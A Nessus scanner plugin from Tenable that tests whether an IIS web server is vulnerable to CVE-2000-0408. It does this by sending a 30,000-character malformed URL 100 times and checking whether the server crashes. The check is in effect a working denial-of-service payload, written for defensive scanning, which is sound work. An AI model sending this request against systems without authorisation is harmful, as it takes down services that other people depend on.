#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# Original code : USSR Lab (www.ussrback.com)
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10406);
  script_version("1.46");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2000-0408");
  script_bugtraq_id(1190);
  script_xref(name:"MSFT", value:"MS00-030");
  script_xref(name:"MSKB", value:"260205");

  script_name(english:"Microsoft IIS Malformed File Extension URL DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is running a version of IIS that allows remote
attackers to cause a denial of service via a long, complex URL that
appears to contain a large number of file extensions, aka the
'Malformed Extension Data in URL' vulnerability.");
  script_set_attribute(attribute:"see_also", value:"https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2000/ms00-030");
  script_set_attribute(attribute:"solution", value:
"Apply the patches referenced above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/05/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/05/12");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2000-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
  script_require_keys("Settings/ParanoidReport", "www/iis");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);
else {
	sig = get_http_banner(port:port);
	if ( sig && ! egrep(pattern:"^Server:.*IIS", string:sig) ) exit(0);
     }


if(get_port_state(port))
{

 if(http_is_dead(port:port))exit(0);

 file = "/%69%6E%64%78" + crap(data:"%2E", length:30000) + "%73%74%6D";
 rq = http_mk_get_req(item:file, port:port);

 for(i=0;i<100;i=i+1)
 {
  r = http_send_recv_req(port: port, req: rq);
  if (isnull(r)) break;
 }


 if(http_is_dead(port:port, retry: 2))security_warning(port);
}

